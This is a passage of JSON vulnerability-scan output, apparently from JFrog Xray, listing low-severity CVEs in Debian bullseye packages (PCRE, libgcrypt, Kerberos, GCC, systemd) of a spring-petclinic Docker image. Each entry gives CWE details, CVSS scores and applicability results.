         "source_id": "deb://debian:bullseye:libpcre3",
         "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
         "component_versions": {
            "id": "debian:bullseye:pcre3",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2017-16231",
                     "cwe": [
                        "CWE-119"
                     ],
                     "cwe_details": {
                        "CWE-119": {
                           "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer",
                           "description": "The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "17"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In PCRE 8.41, after compiling, a pcretest load test PoC produces a crash overflow in the function match() in pcre_exec.c because of a self-recursive call. NOTE: third parties dispute the relevance of this report, noting that there are options that can be used to limit the amount of stack that is used",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2017-16231",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-593361",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgcrypt20",
         "source_id": "deb://debian:bullseye:libgcrypt20",
         "source_comp_id": "deb://debian:bullseye:libgcrypt20:1.8.7-6",
         "component_versions": {
            "id": "debian:bullseye:libgcrypt20",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2236"
                  }
               ],
               "description": "A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-2236",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592121",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libkrb5support0:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26461"
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26461",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592121",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libk5crypto3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26461"
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26461",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592121",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26461"
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26461",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592121",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libkrb5-3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26461"
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26461",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592120",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libk5crypto3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26458",
                     "cwe": [
                        "CWE-401"
                     ],
                     "cwe_details": {
                        "CWE-401": {
                           "name": "Missing Release of Memory after Effective Lifetime",
                           "description": "The product does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory."
                        }
                     }
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26458",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592120",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26458",
                     "cwe": [
                        "CWE-401"
                     ],
                     "cwe_details": {
                        "CWE-401": {
                           "name": "Missing Release of Memory after Effective Lifetime",
                           "description": "The product does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory."
                        }
                     }
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26458",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592120",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libkrb5-3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26458",
                     "cwe": [
                        "CWE-401"
                     ],
                     "cwe_details": {
                        "CWE-401": {
                           "name": "Missing Release of Memory after Effective Lifetime",
                           "description": "The product does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory."
                        }
                     }
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26458",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-592120",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libkrb5support0:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-26458",
                     "cwe": [
                        "CWE-401"
                     ],
                     "cwe_details": {
                        "CWE-401": {
                           "name": "Missing Release of Memory after Effective Lifetime",
                           "description": "The product does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory."
                        }
                     }
                  }
               ],
               "description": "Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-26458",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-56484",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In PCRE 8.41, the OP_KETRMAX feature in the match function in pcre_exec.c allows stack exhaustion (uncontrolled recursion) when processing a crafted regular expression.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre3",
         "source_id": "deb://debian:bullseye:libpcre3",
         "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
         "component_versions": {
            "id": "debian:bullseye:pcre3",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2017-11164",
                     "cwe": [
                        "CWE-674"
                     ],
                     "cwe_details": {
                        "CWE-674": {
                           "name": "Uncontrolled Recursion",
                           "description": "The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack."
                        }
                     },
                     "cvss_v2": "7.8/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:C",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In PCRE 8.41, the OP_KETRMAX feature in the match function in pcre_exec.c allows stack exhaustion (uncontrolled recursion) when processing a crafted regular expression.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "cve_id": "CVE-2017-11164",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - any CLI tool (e.g. \"pcre_exec\", \"grep\") that uses the PCRE library and receives attacker-supplied input",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "vulnerability_id": "CVE-2017-11164",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-531779",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains \nthat target AArch64 allows an attacker to exploit an existing buffer \noverflow in dynamically-sized local variables in your application \nwithout this being detected. This stack-protector failure only applies \nto C99-style dynamically-sized local variables or those created using \nalloca(). The stack-protector operates as intended for statically-sized \nlocal variables.\n\nThe default behavior when the stack-protector \ndetects an overflow is to terminate your application, resulting in \ncontrolled loss of availability. An attacker who can exploit a buffer \noverflow without triggering the stack-protector might be able to change \nprogram flow control to cause an uncontrolled loss of availability or to\n go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:gcc-9-base",
         "source_id": "deb://debian:bullseye:gcc-9-base",
         "source_comp_id": "deb://debian:bullseye:gcc-9-base:9.3.0-22",
         "component_versions": {
            "id": "debian:bullseye:gcc-9",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4039",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                  }
               ],
               "description": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains  that target AArch64 allows an attacker to exploit an existing buffer  overflow in dynamically-sized local variables in your application  without this being detected. This stack-protector failure only applies  to C99-style dynamically-sized local variables or those created using  alloca(). The stack-protector operates as intended for statically-sized  local variables.  The default behavior when the stack-protector  detects an overflow is to terminate your application, resulting in  controlled loss of availability. An attacker who can exploit a buffer  overflow without triggering the stack-protector might be able to change  program flow control to cause an uncontrolled loss of availability or to  go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4039",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-531779",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains \nthat target AArch64 allows an attacker to exploit an existing buffer \noverflow in dynamically-sized local variables in your application \nwithout this being detected. This stack-protector failure only applies \nto C99-style dynamically-sized local variables or those created using \nalloca(). The stack-protector operates as intended for statically-sized \nlocal variables.\n\nThe default behavior when the stack-protector \ndetects an overflow is to terminate your application, resulting in \ncontrolled loss of availability. An attacker who can exploit a buffer \noverflow without triggering the stack-protector might be able to change \nprogram flow control to cause an uncontrolled loss of availability or to\n go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:gcc-10-base",
         "source_id": "deb://debian:bullseye:gcc-10-base",
         "source_comp_id": "deb://debian:bullseye:gcc-10-base:10.2.1-6",
         "component_versions": {
            "id": "debian:bullseye:gcc-10",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4039",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                  }
               ],
               "description": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains  that target AArch64 allows an attacker to exploit an existing buffer  overflow in dynamically-sized local variables in your application  without this being detected. This stack-protector failure only applies  to C99-style dynamically-sized local variables or those created using  alloca(). The stack-protector operates as intended for statically-sized  local variables.  The default behavior when the stack-protector  detects an overflow is to terminate your application, resulting in  controlled loss of availability. An attacker who can exploit a buffer  overflow without triggering the stack-protector might be able to change  program flow control to cause an uncontrolled loss of availability or to  go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4039",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-531779",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains \nthat target AArch64 allows an attacker to exploit an existing buffer \noverflow in dynamically-sized local variables in your application \nwithout this being detected. This stack-protector failure only applies \nto C99-style dynamically-sized local variables or those created using \nalloca(). The stack-protector operates as intended for statically-sized \nlocal variables.\n\nThe default behavior when the stack-protector \ndetects an overflow is to terminate your application, resulting in \ncontrolled loss of availability. An attacker who can exploit a buffer \noverflow without triggering the stack-protector might be able to change \nprogram flow control to cause an uncontrolled loss of availability or to\n go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libstdc++6",
         "source_id": "deb://debian:bullseye:libstdc++6",
         "source_comp_id": "deb://debian:bullseye:libstdc++6:10.2.1-6",
         "component_versions": {
            "id": "debian:bullseye:gcc-10",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4039",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                  }
               ],
               "description": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains  that target AArch64 allows an attacker to exploit an existing buffer  overflow in dynamically-sized local variables in your application  without this being detected. This stack-protector failure only applies  to C99-style dynamically-sized local variables or those created using  alloca(). The stack-protector operates as intended for statically-sized  local variables.  The default behavior when the stack-protector  detects an overflow is to terminate your application, resulting in  controlled loss of availability. An attacker who can exploit a buffer  overflow without triggering the stack-protector might be able to change  program flow control to cause an uncontrolled loss of availability or to  go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4039",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-531779",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains \nthat target AArch64 allows an attacker to exploit an existing buffer \noverflow in dynamically-sized local variables in your application \nwithout this being detected. This stack-protector failure only applies \nto C99-style dynamically-sized local variables or those created using \nalloca(). The stack-protector operates as intended for statically-sized \nlocal variables.\n\nThe default behavior when the stack-protector \ndetects an overflow is to terminate your application, resulting in \ncontrolled loss of availability. An attacker who can exploit a buffer \noverflow without triggering the stack-protector might be able to change \nprogram flow control to cause an uncontrolled loss of availability or to\n go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgcc-s1",
         "source_id": "deb://debian:bullseye:libgcc-s1",
         "source_comp_id": "deb://debian:bullseye:libgcc-s1:10.2.1-6",
         "component_versions": {
            "id": "debian:bullseye:gcc-10",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4039",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                  }
               ],
               "description": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains  that target AArch64 allows an attacker to exploit an existing buffer  overflow in dynamically-sized local variables in your application  without this being detected. This stack-protector failure only applies  to C99-style dynamically-sized local variables or those created using  alloca(). The stack-protector operates as intended for statically-sized  local variables.  The default behavior when the stack-protector  detects an overflow is to terminate your application, resulting in  controlled loss of availability. An attacker who can exploit a buffer  overflow without triggering the stack-protector might be able to change  program flow control to cause an uncontrolled loss of availability or to  go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4039",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-522311",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31437",
                     "cwe": [
                        "CWE-354"
                     ],
                     "cwe_details": {
                        "CWE-354": {
                           "name": "Improper Validation of Integrity Check Value",
                           "description": "The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31437",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-522311",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31437",
                     "cwe": [
                        "CWE-354"
                     ],
                     "cwe_details": {
                        "CWE-354": {
                           "name": "Improper Validation of Integrity Check Value",
                           "description": "The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31437",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-522310",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31439",
                     "cwe": [
                        "CWE-354"
                     ],
                     "cwe_details": {
                        "CWE-354": {
                           "name": "Improper Validation of Integrity Check Value",
                           "description": "The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent \"a reply denying that any of the finding was a security vulnerability.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31439",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-522310",
         "severity": "Low",
